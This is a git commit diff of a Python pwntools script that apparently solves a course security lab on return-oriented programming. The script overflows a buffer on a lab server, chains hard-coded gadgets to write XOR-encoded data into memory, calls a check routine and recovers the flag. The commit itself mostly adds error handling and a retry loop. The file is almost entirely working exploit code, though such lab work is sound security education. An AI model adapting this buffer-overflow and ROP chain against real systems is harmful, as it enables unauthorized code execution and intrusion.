9b8b90b7074de98a1a2e9a1259e419a6b4f56f77
LolaInTa Chi <lolainta@gmail.com>
2023-12-04 11:20:39 +0800

    feat: lab8 rop error handling

--- lab8/rop_rw/share/sol.py
+++ lab8/rop_rw/share/sol.py
@@ -1,67 +1,85 @@
 from pwn import *
 
 context.arch = "amd64"
-r = remote("10.113.184.121", 10051)
 
-# context.terminal = ["tmux", "splitw", "-h"]
-# attach(
-#     r,
-#     """
-#     b *0x40189e
-#     conti
-#     """,
-# )
 
-r.recvuntil(b"secret = ")
-secret = r.recvline().decode().strip()
-secret = int(secret, 16)
-r.recvuntil(b"> ")
+def main(r):
+    # context.terminal = ["tmux", "splitw", "-h"]
+    # attach(
+    #     r,
+    #     """
+    #     b *0x40189e
+    #     conti
+    #     """,
+    # )
 
-log.info(f"secret = {hex(secret)}")
+    r.recvuntil(b"secret = ")
+    secret = r.recvline().decode().strip()
+    secret = int(secret, 16)
+    r.recvuntil(b"> ")
 
-# 0x00000000004020af : pop rdi ; ret
-# 0x0000000000485e8b : pop rdx ; pop rbx ; ret
-# 0x00000000004337e3 : mov qword ptr [rdi], rdx ; ret
+    log.info(f"secret = {hex(secret)}")
 
-v1 = u64(b"kyoumoka")
-v2 = u64(b"waii".ljust(8, b"\x00"))
-# log.info(f"v1 = {p64(v1)}")
-# log.info(f"v2 = {p64(v2)}")
-v1 ^= secret
-v2 ^= secret
-log.info(f"v1 = {p64(v1)}")
-log.info(f"v2 = {p64(v2)}")
-ropc = flat(
-    [
-        #
-        0x00000000004020AF,  # pop rdi ; ret
-        0x4C7320,  # rdi = 0x4C7320
-        0x0000000000485E8B,  # pop rdx ; pop rbx ; ret
-        v1,  # rdx = "kyoumoka"
-        0x4141414141414141,  # rbx = "AAAAAAA"
-        0x00000000004337E3,  # mov qword ptr [rdi], rdx ; ret
-        #
-        0x00000000004020AF,  # pop rdi ; ret
-        0x4C7320 + 8,  # rdi = 0x4C7328
-        0x0000000000485E8B,  # pop rdx ; pop rbx ; ret
-        v2,  # rdx = "waii"
-        0x4141414141414141,  # rbx = "AAAAAAA"
-        0x00000000004337E3,  # mov qword ptr [rdi], rdx ; ret
-        0x00000000004020AF,  # pop rdi ; ret
-        0x4C7320,  # rdi = 0x4C7320
-        0x4017BA,  # check address
-    ]
-)
-payload = b"a" * 0x28 + ropc
-# input()
-r.sendline(payload)
-# print(payload)
-r.recvuntil(b"flag = ")
-res = r.recvline()[:16]
-log.info(f"res = {res}")
-flag = p64(u64(b"kyoumoka") ^ secret ^ u64(res[0:8]))
-flag += p64(u64(b"waii".ljust(8, b"\x00")) ^ secret ^ u64(res[8:16]))
-flag = flag.decode().strip()
-log.info(f"flag = {flag}")
+    # 0x00000000004020af : pop rdi ; ret
+    # 0x0000000000485e8b : pop rdx ; pop rbx ; ret
+    # 0x00000000004337e3 : mov qword ptr [rdi], rdx ; ret
 
-# r.interactive()
+    v1 = u64(b"kyoumoka")
+    v2 = u64(b"waii".ljust(8, b"\x00"))
+    # log.info(f"v1 = {p64(v1)}")
+    # log.info(f"v2 = {p64(v2)}")
+    v1 ^= secret
+    v2 ^= secret
+    log.info(f"v1 = {p64(v1)}")
+    log.info(f"v2 = {p64(v2)}")
+    ropc = flat(
+        [
+            #
+            0x00000000004020AF,  # pop rdi ; ret
+            0x4C7320,  # rdi = 0x4C7320
+            0x0000000000485E8B,  # pop rdx ; pop rbx ; ret
+            v1,  # rdx = "kyoumoka"
+            0x4141414141414141,  # rbx = "AAAAAAA"
+            0x00000000004337E3,  # mov qword ptr [rdi], rdx ; ret
+            #
+            0x00000000004020AF,  # pop rdi ; ret
+            0x4C7320 + 8,  # rdi = 0x4C7328
+            0x0000000000485E8B,  # pop rdx ; pop rbx ; ret
+            v2,  # rdx = "waii"
+            0x4141414141414141,  # rbx = "AAAAAAA"
+            0x00000000004337E3,  # mov qword ptr [rdi], rdx ; ret
+            #
+            0x00000000004020AF,  # pop rdi ; ret
+            0x4C7320,  # rdi = 0x4C7320
+            0x4017BA,  # check address
+        ]
+    )
+    payload = b"a" * 0x28 + ropc
+    # input()
+    r.sendline(payload)
+    # print(payload)
+    r.recvuntil(b"flag = ")
+    res = r.recvline()
+    while len(res) < 16:
+        log.info(f"res = {res}, len = {len(res)}")
+        res += r.recvline()
+    res = res[:16]
+    log.info(f"res = {res}, len = {len(res)}")
+    flag = p64(u64(b"kyoumoka") ^ secret ^ u64(res[0:8]))
+    flag += p64(u64(b"waii".ljust(8, b"\x00")) ^ secret ^ u64(res[8:16]))
+    flag = flag.decode().strip()
+    log.info(f"flag = {flag}")
+
+    # r.interactive()
+
+
+if __name__ == "__main__":
+    while True:
+        try:
+            r = remote("10.113.184.121", 10051)
+            main(r)
+        except Exception as e:
+            log.warning(f"{type(e).__name__}: {e}")
+        finally:
+            r.close()
+        input()
